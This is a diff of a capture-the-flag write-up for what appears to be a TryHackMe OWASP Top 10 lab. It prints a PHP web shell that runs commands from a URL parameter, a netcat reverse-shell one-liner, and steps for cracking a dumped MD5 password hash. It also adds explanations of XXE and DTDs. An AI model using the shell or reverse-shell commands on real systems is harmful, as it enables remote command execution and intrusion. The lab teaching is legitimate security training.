@@ -43,19 +43,19 @@ Use these links as references.
 Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef`, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.
 
 A reverse shell can also be spawned. A `netcat` listener can be spawned as below.
-{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code }
 
 In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse shell.
-{% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code }
 
 The sample php shell code from `evilshell.php` is as below.
-{% capture code %}{% raw %}<?php
+{% capture code %}<?php
   if (isset($_GET["commandString"])) {
     $command_string = $_GET["commandString"];
     try { passthru($command_string); }
     catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
   }
-?>{% endraw %}{% endcapture %} {% include code.html code=code lang="php"%}
+?>{% endcapture %} {% include code.html code=code lang="php"%}
 
 To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 
@@ -89,7 +89,7 @@ Using `nmap` as below, all info can be gathered for the task.
 
 An output similar to below will be obtained.
 {% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-03 19:03 BST
-Nmap scan report for ip-10-10-194-110.eu-west-1.compute.internal (<ip>)
+Nmap scan report for <hostname> (<ip>)
 Host is up (0.00091s latency).
 Not shown: 999 closed ports
 PORT   STATE SERVICE
@@ -126,5 +126,56 @@ sqlite> select * from users;
 4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Use `firefox` and the online tool `https://crackstation.net` to crack the `MD5` hash we got previously. Use the username `admin` and cracked `password` to get the `flag`.
+
+
+## Task 12 - [Severity 4] XML External Entity
+
+XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
+  - It allows to interact with any backend or external systems that the application can access and allow to read the file on that system.
+  - They can cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications.
+  - XXE may even enable port scanning and lead to remote code execution.
+
+Two types of XXE attacks.
+  - In-band XXE attack can receive an immediate response to the XXE payload.
+  - Out-of-band XXE attacks (blind XXE), there is no immediate response from the web application and need to reflect the output of XXE payload to some other file or their own server.
+
+
+## Task 13 - [Severity 4] XML External Entity - eXtensible Markup Language
+
+XML (eXtensible Markup Language) is a markup language that defines set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
+
+  - XML is platform-independent and programming language independent.
+  - The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
+  - XML allows validation using DTD (Document Type Definition) and Schema.
+  - XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.
+  - XML document mostly starts with what is known as XML Prolog <?xml version="1.0" encoding="UTF-8"?>.
+
+
+## Task 14 - [Severity 4] XML External Entity - DTD
+
+DTD defines the structure and the legal elements and attributes of an XML document.
+
+Example DTD file `note.dtd`.
+{% capture code %}{% raw %}<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+The type of elements in `note.dtd` file is as below.
+{% capture code %}{% raw %}!DOCTYPE note -  Defines a root element of the document named note
+!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
+!ELEMENT to - Defines the to element to be of type "#PCDATA"
+!ELEMENT from - Defines the from element to be of type "#PCDATA"
+!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
+!ELEMENT body - Defines the body element to be of type "#PCDATA"
+!ENTITY - Defines new entity to be used as shortcut in XML file
+#PCDATA - Parseable Character DATA{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+Example `note.xml` file referring to `note.dtd`.
+{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note SYSTEM "note.dtd">
+<note>
+    <to>falcon</to>
+    <from>feast</from>
+    <heading>hacking</heading>
+    <body>XXE attack</body>
+</note>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
